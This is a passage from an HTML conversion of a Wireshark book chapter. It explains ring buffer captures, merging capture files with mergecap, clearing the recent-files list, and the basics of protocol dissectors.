example.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You need to create a new file after every 10 seconds, with the base file name &#8220;10SecRing&#8221; to save on the desktop. Then, you also enable the ring buffer for a ring of five files. To see all those settings in place, refer to<a name="_bookmark323" ></a>&nbsp;</span><span><a href="#_bookmark324" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-21</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section170" ><p class=MsoBodyText ><img width="779"  height="394"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker220001.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark324" ></a><span><a href="#_bookmark323" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-21:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Setting multiple files and ring buffer</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >From this dialog box, start the capture immediately by clicking Start. After every 10 seconds, the Packet List pane clears for a brief moment, hinting the capture just started a new file. No packets are dropped in the course of closing one file and reopening another.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.0500pt;" ><a name="_bookmark325" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark will continue to make new capture files until the ring buffer&#8217;s threshold is reached. By choosing a ring buffer of five files, the sixth capture file will overwrite the first capture file. You will have a ring buffer of five full files containing the most recent packets captured. Again, multiple files are named with incrementing numbers and with the start time of the capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After more than a minute, stop the capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As shown in<a name="_bookmark326" ></a>&nbsp;</span><span><a href="#_bookmark327" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-22</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you have the five ring buffer files. Note the filenames include a date and time stamp, beginning with the base name and sequential number. Also note the five files are now numbered 00003-00007, because after 50 seconds, the first file was overwritten and it continues in that manner.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section171" ><p class=MsoBodyText  style="margin-left:47.0000pt;" ><img width="650"  height="293"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker221131.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark327" ></a><span><a href="#_bookmark326" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-22:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Resultant ring buffer files</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Merging Multiple Files</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You might opt to merge two or more capture files together. While the GUI offers the option under File to merge capture files, it is easier and more flexible to use the command-line tool mergecap. Mergecap is part of the Wireshark distribution. If you are using Windows, you&#8217;ll find mergecap in the Wireshark directory.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:16.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For example, let&#8217;s merge three of the 10SecRing capture files into one 30-second capture file. For this example, we&#8217;ll use Windows.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l0 level1 lfo10;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Open a command window and run as</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Administrator.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:20.6000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l0 level1 lfo10;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Set a path for Windows to find mergecap. This is done with the command </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set PATH=%PATH%;"c:\Program Files\Wireshark"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(if you installed Wireshark in the default</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >location).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.8000pt;margin-right:31.7500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l0 level1 lfo10;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Go to the location of your capture files to be merged and use</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the following command and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >syntax:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >mergecap -w 30SecCap 10SecRing_00003_20161006110657 10SecRing_00004_20161006110707 10SecRing_00005_20161006110717</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  align=justify  style="margin-right:17.7500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-w</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >switch tells mergecap to output as a file, named &#8220;30SecCap&#8221; in our case. You follow the output file with the files to be merged. That&#8217;s it!</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:6.3500pt;" ><a name="_bookmark328" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-v</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >verbose switch, mergecap will tell you the format type of each file, pcapng in our case, as shown in<a name="_bookmark329" ></a>&nbsp;</span><span><a href="#_bookmark330" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-23</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. (Be careful if</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section172" ><p class=MsoBodyText  style="margin-top:3.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >you&#8217;re merging a million packets, however; verbose will echo that each record is merged, every step of the way!)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="783"  height="186"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker222550.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark330" ></a><span><a href="#_bookmark329" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-23:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Mergecap verbose</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the end, mergecap will humbly echo it&#8217;s complete (see<a name="_bookmark331" ></a>&nbsp;</span><span><a href="#_bookmark332" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-24</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="778"  height="167"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker222717.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark332" ></a><span><a href="#_bookmark331" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-24:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Mergecap complete</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s important to note that you do not have to merge capture files that are perfectly adjacent to each other with respect to time. For example, you can merge capture files from different days together. Wireshark will set the timestamps relative to each other chronologically.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Recent Capture Files</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:43.8500pt;" ><span style="position:absolute;z-index:-1;margin-left:407.5000px;margin-top:80.6667px;width:22.0000px;height:17.0000px;" ><img width="22"  height="17"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker223079.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first time you launch Wireshark, you see the list of network interfaces. You pick the interface here or you can choose it within Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >under</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Capture</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Options. Let&#8217;s assume you&#8217;ve</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >already captured packets and then saved to a</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next time you open Wireshark, the interfaces are no longer the top item shown. Now it&#8217;s a list of capture files recently opened or saved.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This list, under the heading Open, is shown above the Capture heading with the interfaces. The list of recently opened capture files shows the path of the capture file, the name, and total size. This list will continue</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section173" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:6.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to grow to the maximum allowed number. If too many are present, just scroll down to select the capture file you want. Wireshark obviously confirms file availability, because for any captures not available, the full path and filename will be italicized, followed by &#8220;(not found)&#8221;.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.7500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Clearing or Stopping the Recent Files</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Maybe you don&#8217;t <a name="_bookmark333" ></a>want recent capture files showing up there. Because maybe you don&#8217;t want a client shoulder-surfing as you open Wireshark, spotting the names of another client&#8217;s traces or seeing filenames suggesting problems. In any case, the list of recent captures can pose a confidentiality risk.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s a simple few clicks to clear out the list of recent files. Once in Wireshark, click File on the top menu bar, then Open Recent. At the bottom of the recent file choices, you will see Clear Menu, as shown in<a name="_bookmark334" ></a>&nbsp;</span><span><a href="#_bookmark335" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-25</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="783"  height="186"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker224553.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark335" ></a><span><a href="#_bookmark334" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-25:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Clearing recent files</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you want fewer recent files to show, or perhaps none at all, click</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Edit on the top menu, then Preferences. In the Appearance menu, you can use the Show up to option to select the number of recent files to display (see<a name="_bookmark336" ></a>&nbsp;</span><span><a href="#_bookmark337" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.2000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >4-26</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section174" ><p class=MsoBodyText ><img width="783"  height="555"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker224890.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark337" ></a><span><a href="#_bookmark336" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-26:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Changing the number of recent files shown</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="_bookmark338" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Dissectors" ></a>Dissectors</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark339" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Dissectors are the magic that changes the bytes on the wire to the rich information displayed in the UI. Dissectors are one of the most important features that make Wireshark the powerful tool it is. Each protocol is parsed by a dissector and passed on to the next dissector until everything up to the Application layer has been converted from bits and bytes to all the separate fields and human-readable descriptions that are presented in the different parts of the UI. Dissectors are also what define the fields that allow you to apply the various filters. (Filters are discussed in more detail later in this chapter.) For now, this section serves as a quick introduction to dissectors. </span><span><a href="#_bookmark601" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 8</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >walks through creating custom dissectors to parse custom protocols.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first dissector is always the Frame dissector. It adds the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section175" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >timestamps and passes the raw bytes to the next-lowest protocol dissector&#8212;usually Ethernet. Wireshark uses a combination of tables containing which protocols are built on top of which other protocols combined with heuristics like port numbers to decide which dissector to apply to a packet. Some protocols, like Ethernet, have a field that states which protocol it is encapsulating, so heuristics are not needed and Wireshark can easily pick the right dissector for the job.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.5500pt;margin-right:21.7500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In basic Wireshark traffic analysis, you won&#8217;t need to tweak</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >anything about dissectors. You will occasionally come across a scenario where Wireshark isn&#8217;t able to determine the appropriate dissector to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >use.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This often happens with HTTP traffic over a nonstandard port.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span 